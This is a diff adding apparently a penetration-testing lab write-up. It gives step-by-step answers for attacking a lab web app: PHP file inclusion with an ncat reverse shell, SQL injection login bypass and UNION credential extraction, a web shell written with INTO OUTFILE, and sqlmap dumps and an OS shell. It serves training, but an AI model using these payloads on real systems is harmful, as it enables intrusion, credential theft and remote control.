@@ -29,4 +29,56 @@ Finally, we reload the URL with the remote path as the `file` parameter, and the
 2. We use the above to supply a cmd that opens a reverse shell back to our machine, using
 `http://192.168.224.10/menu.php?file=data:text/plain,%3C?php%20echo%20%27%3Cpre%3E%27%20.%20shell_exec($_GET[%27cmd%27])%20.%20%27%3C/pre%3E%27;?%3E&cmd=ncat%20192.168.119.224%204444%20-e%20cmd.exe`
 
-==
+== 9.4.5.4
+
+1. Using the `root/root` username/password pair we recovered earlier, we login into the phpmyadmin interface. There, we can run SQL query that results into a true value, like:
+
+image::module_9/sql_inject_query.png[]
+
+2. By using the input `tom' or 1=1 limit 1;#`, we force the SQL query to resolve to true, which allows us to login
+3. Looking at the source code of the page (under `c:/xampp/htdocs/admin.php`), the application seems to read the value input into the username field, and set it to the `$_SESSION['user']` field, which is reused in that header.
+4. We use the value `tom` for the username, and `' or 1=1 limit 1;#` for the password. Setting the limit to 1 is necessary because the web app needs an exact match of 1 to treat the query as a true value.
+
+== 9.4.5.9
+
+1. Using `debug.php?id=1 ORDER BY 4` returns an error, suggesting that there are only 3 columns in the database. We then use `debug.php?id=1 UNION SELECT 1, 2, table_name from information_schema.tables` to enumerate the list of tables
+2. This is because the list of results is returned as a SQL cursor, and they simply iterate through every single row in that cursor, displaying the results directly into the HTML without escaping it.
+3. We use `debug.php?id=1 UNION SELECT 1, username, password from users` to get the list of usernames and passwords.
+
+== 9.4.5.11
+
+1. First, we start by creating the backdoor file, using the URL `debug.php?id=1 union SELECT 1,2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`
+This allows us to pass any command we want.
+2. Then, we simply  use the URL `backdoor.php?cmd=ncat%20192.168.119.224%204444%20-e%20cmd.exe` which opens a reverse shell with a local listener.
+
+== 9.4.5.13
+
+1. `sqlmap -u http://192.168.224.10/debug.php?id=1 -p "id" --dbms=mysql --dump` gives
+
+```
+Database: webappdb
+Table: feedback
+[2 entries]
++----+----------------------------------------------+------+
+| id | text                                         | name |
++----+----------------------------------------------+------+
+| 1  | Great tacos today!                           | Jake |
+| 2  | I would eat tacos here every day if I could! | John |
++----+----------------------------------------------+------+
+```
+
+And 
+
+```
+Database: webappdb
+Table: users
+[2 entries]
++----+----------+--------------+
+| id | username | password     |
++----+----------+--------------+
+| 1  | admin    | p@ssw0rd     |
+| 2  | jigsaw   | footworklure |
++----+----------+--------------+
+```
+
+2. `sqlmap -u http://192.168.224.10/debug.php?id=1 -p "id" --dbms=mysql --os-shell` gives us a shell
